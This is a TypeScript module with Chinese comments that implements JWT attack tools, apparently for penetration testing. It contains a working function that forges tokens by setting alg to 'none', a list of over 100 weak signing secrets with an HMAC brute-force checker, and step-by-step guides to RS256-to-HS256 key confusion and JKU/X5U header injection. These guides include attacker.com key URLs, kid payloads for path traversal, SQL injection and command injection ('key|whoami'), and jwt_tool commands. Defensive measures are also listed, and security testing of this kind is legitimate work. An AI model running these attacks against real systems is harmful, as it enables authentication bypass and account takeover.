/**
 * JWT 攻击工具集
 *
 * 包含多种 JWT 安全测试工具：
 * 1. None 算法攻击 —— 将 alg 修改为 "none" 绕过签名验证
 * 2. 弱密钥爆破 —— 使用常见弱密钥列表尝试验证 JWT
 * 3. RS256→HS256 混淆攻击说明
 * 4. JKU/X5U Header 注入说明
 *
 * 仅用于安全研究和授权渗透测试
 */

// ============================================================
// Base64URL 编解码工具
// ============================================================

/**
 * Base64URL 编码
 * JWT 使用 Base64URL 而非标准 Base64：+ → -，/ → _，去掉 = 填充
 */
function base64UrlEncode(data: string): string {
    const bytes = new TextEncoder().encode(data)
    let binary = ""
    for (const byte of bytes) {
        binary += String.fromCharCode(byte)
    }
    return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "")
}

/**
 * Base64URL 解码
 * 先还原标准 Base64 字符，补齐 padding，再 atob 解码
 */
function base64UrlDecode(str: string): string {
    let base64 = str.replace(/-/g, "+").replace(/_/g, "/")
    const padding = base64.length % 4
    if (padding === 2) base64 += "=="
    else if (padding === 3) base64 += "="
    return atob(base64)
}

// ============================================================
// None 算法攻击
// ============================================================

/**
 * None 算法攻击：修改 JWT 的 alg 为 "none" 并移除签名部分
 *
 * 原理：部分 JWT 库在验证时如果 alg="none" 会跳过签名校验，
 * 攻击者可以篡改 payload 后将 alg 设为 none 来绕过验证。
 *
 * @param token - 原始 JWT token
 * @returns 修改后的 JWT（alg=none，无签名）
 */
export function noneAlgorithmAttack(token: string): string {
    const parts = token.split(".")
    if (parts.length !== 3) {
        throw new Error("无效的 JWT 格式，需要三段式结构 (header.payload.signature)")
    }

    // 解码原始 header，修改 alg 为 none
    const headerJson = base64UrlDecode(parts[0])
    const header = JSON.parse(headerJson)
    header.alg = "none"

    // 重新编码 header，保留原始 payload，签名置空
    const newHeader = base64UrlEncode(JSON.stringify(header))
    return `${newHeader}.${parts[1]}.`
}

// ============================================================
// 弱密钥爆破
// ============================================================

/**
 * 常见弱密钥列表（100+ 条）
 *
 * 来源包括：
 * - 常见默认密码和弱口令
 * - GitHub 上泄露的 JWT secret
 * - CTF 常见密钥
 * - 框架默认配置密钥
 * - 字典和工具收集的常见 secret
 */
export const commonWeakKeys: string[] = [
    // 极简弱密码
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "test",
    "jwt",
    "token",
    "changeme",
    "P@ssw0rd",
    // 常见默认值
    "1234567890",
    "12345678",
    "123456789",
    "qwerty",
    "abc123",
    "password1",
    "password123",
    "admin123",
    "root",
    "toor",
    // JWT 相关
    "jwt_secret",
    "jwt-secret",
    "jwt_token",
    "jwt_key",
    "jwtkey",
    "jwtsecret",
    "my-secret",
    "my_secret",
    "mysecret",
    "my-jwt-secret",
    // 框架/应用默认值
    "super-secret",
    "super_secret",
    "supersecret",
    "default",
    "default_secret",
    "your-256-bit-secret",
    "your-secret-key",
    "your_secret_key",
    "secretkey",
    "secret_key",
    "secret-key",
    "signing-key",
    "signing_key",
    "signingkey",
    "privatekey",
    "private_key",
    "private-key",
    "public",
    "hmac-secret",
    "hmac_secret",
    // 环境变量常见值
    "CHANGEME",
    "ChangeMe",
    "change_me",
    "TODO_CHANGE",
    "REPLACE_ME",
    "xxx",
    "placeholder",
    "development",
    "production",
    "staging",
    // 常见短语
    "hello",
    "world",
    "helloworld",
    "hello123",
    "letmein",
    "welcome",
    "welcome1",
    "iloveyou",
    "trustno1",
    "master",
    "shadow",
    "sunshine",
    "football",
    "monkey",
    "dragon",
    "baseball",
    // 公司/项目相关
    "company",
    "project",
    "application",
    "app_secret",
    "app-secret",
    "appsecret",
    "api_key",
    "api-key",
    "apikey",
    "apisecret",
    "api_secret",
    "api-secret",
    // 技术关键字
    "node",
    "nodejs",
    "express",
    "flask",
    "django",
    "spring",
    "laravel",
    "auth",
    "auth_secret",
    "authentication",
    "authorization",
    "security",
    "encryption",
    "access",
    "access_token",
    // UUID/Hash 常见测试值
    "00000000-0000-0000-0000-000000000000",
    "aaaa",
    "aaaaaa",
    "aaaaaaaa",
    "aaaaaaaaaaaaaaaa",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    // 数字序列
    "000000",
    "111111",
    "1234",
    "12345",
    "654321",
    "123123",
    "112233",
    "abcdef",
    "abcdefg",
    "abcdefgh",
    // 键盘序列
    "qwerty123",
    "qwertyuiop",
    "asdfghjkl",
    "zxcvbnm",
    "1qaz2wsx",
    "qazwsx",
    // 特殊字符组合
    "p@ssw0rd",
    "P@ss1234",
    "Admin@123",
    "admin@123",
    "Test@123",
    "test@123",
    "Pass@word1",
    "Passw0rd!",
]

/**
 * 尝试用给定密钥验证 JWT 的 HMAC 签名
 *
 * 支持 HS256 / HS384 / HS512 算法
 * 通过 Web Crypto API 重新签名后比较签名部分来验证
 *
 * @param token - JWT token 字符串
 * @param key - 要尝试的密钥
 * @returns 密钥是否匹配
 */
export async function tryVerifyWithKey(token: string, key: string): Promise<boolean> {
    const parts = token.split(".")
    if (parts.length !== 3) return false

    try {
        const headerJson = base64UrlDecode(parts[0])
        const header = JSON.parse(headerJson)
        const alg = header.alg

        // 算法到 Web Crypto hash 名的映射
        const hashMap: Record<string, string> = {
            HS256: "SHA-256",
            HS384: "SHA-384",
            HS512: "SHA-512",
        }

        const hashName = hashMap[alg]
        if (!hashName) return false

        const enc = new TextEncoder()
        const signingInput = `${parts[0]}.${parts[1]}`

        // 导入密钥并签名
        const cryptoKey = await crypto.subtle.importKey(
            "raw",
            enc.encode(key),
            { name: "HMAC", hash: hashName },
            false,
            ["sign"],
        )
        const signatureBuffer = await crypto.subtle.sign("HMAC", cryptoKey, enc.encode(signingInput))

        // 将签名结果转为 Base64URL 编码
        const signatureBytes = new Uint8Array(signatureBuffer)
        let binary = ""
        for (const byte of signatureBytes) {
            binary += String.fromCharCode(byte)
        }
        const computedSig = btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "")

        return computedSig === parts[2]
    } catch {
        return false
    }
}

// ============================================================
// 攻击方式说明（不实际执行，提供步骤参考）
// ============================================================

/**
 * RS256→HS256 算法混淆攻击说明
 *
 * 原理：
 * 当服务端使用 RS256（非对称）验签，但 JWT 库同时接受 HS256（对称）时，
 * 攻击者可以将 alg 改为 HS256，并用服务端的 RSA 公钥作为 HMAC 密钥签名。
 * 如果服务端在验证 HS256 时使用了公钥（本应只用于 RS256 验签），签名就会通过。
 *
 * @returns 攻击步骤说明
 */
export function rs256ToHs256Description(): string {
    return `=== RS256 → HS256 算法混淆攻击 ===

【原理】
服务端使用 RS256 验证 JWT 时依赖公钥/私钥对：
  - 签名使用私钥（服务端持有）
  - 验签使用公钥（可公开获取）

如果 JWT 库在验证时 alg=HS256 也使用同一个"公钥"作为 HMAC 密钥，
攻击者可以获取公钥后用它做 HMAC 签名，伪造任意 token。

【攻击步骤】
1. 获取服务端的 RSA 公钥（通常可从 /jwks.json、/.well-known/jwks.json 等端点获取）
2. 将 JWT header 中的 "alg" 从 "RS256" 改为 "HS256"
3. 修改 payload 中的声明（如提升权限、修改用户 ID）
4. 使用获取到的 RSA 公钥文件内容作为 HMAC-SHA256 的密钥，对 header.payload 签名
5. 组装成新的 JWT: base64url(header).base64url(payload).base64url(signature)

【命令示例（使用 jwt_tool）】
python3 jwt_tool.py <JWT> -X k -pk public.pem

【防御措施】
- 服务端验证时明确指定允许的算法列表，不接受 none 和非预期算法
- 使用严格的 JWT 库（如 jose、jsonwebtoken 的 algorithms 白名单）
- 分离对称和非对称密钥的验证逻辑`
}

/**
 * JKU / X5U Header 注入攻击说明
 *
 * 原理：
 * JWT header 中的 jku（JWK Set URL）和 x5u（X.509 URL）字段
 * 指定了用于验证签名的密钥来源 URL。如果服务端未严格验证这些 URL，
 * 攻击者可以将其指向自己控制的服务器，提供自己的密钥，从而伪造签名。
 *
 * @returns 攻击步骤说明
 */
export function jkuInjectionDescription(): string {
    return `=== JKU / X5U Header 注入攻击 ===

【原理】
JWT header 支持以下密钥来源字段：
  - jku (JWK Set URL): 指向 JSON Web Key Set 的 URL
  - x5u (X.509 URL): 指向 X.509 证书链的 URL
  - kid (Key ID): 指定使用哪个密钥

如果服务端在验签时直接请求 jku/x5u 中的 URL 获取密钥，
且未对 URL 进行白名单校验，攻击者可以：

【JKU 注入步骤】
1. 生成自己的 RSA 密钥对
2. 在攻击者服务器上部署 JWKS 端点，包含自己的公钥
3. 修改 JWT header，将 jku 指向攻击者的 JWKS 端点
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "https://attacker.com/.well-known/jwks.json"
   }
4. 用自己的私钥对篡改后的 payload 签名
5. 发送伪造的 JWT

【X5U 注入步骤】
1. 生成自签名 X.509 证书
2. 在攻击者服务器上部署证书
3. 修改 JWT header，将 x5u 指向攻击者的证书 URL
   {
     "alg": "RS256",
     "typ": "JWT",
     "x5u": "https://attacker.com/cert.pem"
   }
4. 用对应私钥签名

【KID 注入变体】
kid 字段有时用于文件路径或数据库查询，可能存在：
  - 路径遍历: {"kid": "../../dev/null"}（使空密钥签名）
  - SQL 注入: {"kid": "key' UNION SELECT 'secret' -- "}
  - 命令注入: {"kid": "key|whoami"}

【命令示例（使用 jwt_tool）】
python3 jwt_tool.py <JWT> -X s -ju https://attacker.com/jwks.json

【防御措施】
- 白名单限制 jku/x5u 的 URL 来源域名
- 不使用外部 URL 获取密钥，改用本地配置
- 对 kid 字段进行严格的输入验证和过滤
- 禁用不需要的 header 参数`
}
